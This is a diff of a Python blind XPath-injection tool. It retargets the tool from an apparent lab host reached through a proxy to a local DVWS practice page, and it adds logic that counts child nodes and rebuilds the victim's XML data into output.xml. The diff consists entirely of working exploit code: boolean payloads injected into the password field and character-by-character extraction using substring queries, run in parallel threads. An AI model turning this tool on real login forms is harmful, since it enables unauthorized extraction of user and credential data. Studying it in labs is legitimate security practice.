@@ -6,12 +6,17 @@ import xml.etree.ElementTree as ET
 import concurrent.futures
 
 
+
 def inject(payload): ## function that returns True in the case of a success condition
-    url = "http://172.31.179.1/intranet.php"
-    username = fr"' or {payload} or 'a'='a"
-    password = f"test"
-    r = requests.post(url, data={"Username":username, "Password":password}, proxies={"http": "http://10.129.24.223:3128"})
-    return len(r.content) > 7000
+    url = "http://127.0.0.1:80/dvws/vulnerabilities/xpath/xpath.php"
+    username = "admin"
+    password = f"admin' or {payload} and 'b'='b"
+    params = {"login": username, "password": password, "form": "submit"}
+    try:
+        resp = requests.get(url, params=params)
+    except requests.ConnectionError:
+        return False
+    return "Accepted User" in resp.text
     
 
 def extract_data(data, path, index):
@@ -23,7 +28,7 @@ def extract_data(data, path, index):
         newpath = "/" + "/".join(path.split("/")[1:-1])
         node = "/" + path.split("/")[-1]
         query = fr"substring({newpath}[position()={index}]{node}"
-        charspace = "".join(chr(i) for i in range(ord("!"), ord("~") + 1) if chr(i) not in ["'",'"',])
+        charspace = "".join(chr(i) for i in range(ord(" "), ord("~") + 1) if chr(i) not in ["'",'"',])
         
     skeleton = r"{},{},1)='{}'"
     output = ""
@@ -42,10 +47,37 @@ def extract_data(data, path, index):
         print("Node: " + output)
     return output
     
+
     
 def map_helper(args):
     return extract_data(args[0], args[1], args[2])
-    
+
+
+
+def get_number_of_children(node):
+    current_count = 0
+    while True:
+        query = f"count({node}/*)={current_count}"
+        if inject(query):
+            return current_count
+        current_count += 1
+
+
+
+def all_nodes_extracted_check(tree, depth):
+    queue = [i[0] for i in tree[depth]]
+    index = 0
+    output = True
+    while index < len(queue) and output:
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            threads = [queue[thread] for thread in range(index,min(index+5, len(queue)))]
+            for result in executor.map(get_number_of_children, threads):
+                if result != 0:
+                    output = False
+        index += 5
+    return output
+
+
     
 def gen_xml():
     tree = {1:[]}
@@ -65,29 +97,30 @@ def gen_xml():
                         if result == "":
                             done = True
                         else:
-                            tree[depth+1].append((tree[depth][idx][0]+"/"+result, (ET.SubElement(tree[depth][idx][1], result))))
+                            count = 1
+                            node = tree[depth][idx][0]+"/"+result
+                            for j in tree[depth+1]:
+                                path = j[0].rstrip("0123456789[]")
+                                if node == path:
+                                   count += 1
+                            node = f"{node}[{count}]"
+                            tree[depth+1].append((node, ET.SubElement(tree[depth][idx][1], result)))
                 index += 5
-                        
-        if tree[depth+1] == []:
+        
+        if all_nodes_extracted_check(tree, depth):
             nodes_done = True
         depth += 1
 
-    leaves = {}
     queue = []
-    for i in tree:
-        for jindex, j in enumerate(tree[i]):
-            if len(j[1]) == 0:
-                try:
-                    leaves[j[0]] += 1
-                except KeyError:
-                    leaves[j[0]] = 1
-                queue.append((i, jindex, leaves[j[0]]))
-                    
-    print()            
+    for depth in tree:
+        for idx, i in enumerate(tree[depth]):
+            if len(i[1]) == 0: # Check if ET Element has no child nodes
+                queue.append((depth, idx))
+
     index = 0
     while index < len(queue):
         with concurrent.futures.ThreadPoolExecutor() as executor:
-            threads = [("content", tree[queue[i][0]][queue[i][1]][0], queue[i][2]) for i in range(index, min(index + 5, len(queue)))]
+            threads = [("content", tree[queue[i][0]][queue[i][1]][0], 1) for i in range(index, min(index + 5, len(queue)))]
             for idx, result in enumerate(executor.map(map_helper, threads), start=index):
                 print(tree[queue[idx][0]][queue[idx][1]][0].split("/")[-1].capitalize() + ": " + result)
                 tree[queue[idx][0]][queue[idx][1]][1].text = result
@@ -96,7 +129,7 @@ def gen_xml():
     final_tree = ET.ElementTree(tree[1][0][1])
     ET.indent(final_tree)
     final_tree.write("output.xml")
-    print("Done! Read using: xmllint --format output.xml | highlight --syntax=xml --out-format=xterm256 | less -R -N")
+    print("Done! output.xml created!")
     
 
 def main():
